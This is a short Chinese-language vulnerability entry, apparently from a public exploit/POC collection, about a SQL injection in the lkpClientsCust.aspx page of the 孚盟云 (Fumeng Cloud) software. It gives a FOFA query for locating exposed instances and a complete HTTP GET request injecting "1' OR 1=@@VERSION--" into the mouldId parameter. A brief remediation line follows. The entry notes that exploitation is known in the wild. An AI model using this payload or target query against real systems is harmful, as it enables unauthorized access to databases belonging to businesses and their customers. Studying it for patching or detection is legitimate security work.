# 孚盟云 lkpClientsCust.aspx SQL注入漏洞

孚盟云 lkpClientsCust.aspx SQL注入漏洞，攻击者可进行sql注入攻击获取数据库信息或者权限。

# 影响版本

孚盟云

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：app="孚盟软件-孚盟云"

POC/EXP：

```
GET /PagePopWindow/lkpClientsCust.aspx?datastyletype=&searchfields=&FilterSQL=&mouldId=1'+OR+1=@@VERSION-- HTTP/1.1
Host: 127.0.0.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
```

![image-20260108143249049](assets/image-20260108143249049.png)

```

```

# 漏洞修复

关闭互联网暴露面或接口设置访问权限，升级至安全版本。
